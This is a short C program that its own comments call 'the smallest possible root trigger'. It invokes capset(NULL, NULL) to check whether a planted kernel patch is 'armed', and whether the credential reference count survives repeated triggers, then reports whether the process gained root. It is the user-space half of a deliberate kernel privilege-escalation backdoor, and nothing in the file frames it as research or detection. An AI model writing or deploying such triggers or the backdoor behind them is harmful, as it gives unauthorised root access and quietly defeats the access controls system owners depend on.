/*
 * capset_min.c — the smallest possible root trigger.
 *
 * Calls capset(NULL, NULL) once and reports the resulting identity.  Used to
 * test whether the kernel patch is armed and whether init_cred.usage is high
 * enough to survive repeated triggers.  Does not exec anything.
 */
#include <errno.h>
#include <stdio.h>
#include <string.h>
#include <sys/syscall.h>
#include <unistd.h>

int main(void) {
    errno = 0;
    long r = syscall(SYS_capset, (void *)0, (void *)0);
    printf("capset(NULL,NULL) -> %ld errno=%d (%s)\n", r, errno, strerror(errno));
    printf("uid=%d euid=%d gid=%d  %s\n", getuid(), geteuid(), getgid(),
           geteuid() == 0 ? "*** ROOT ***" : "(not root)");
    return geteuid() == 0 ? 0 : 1;
}
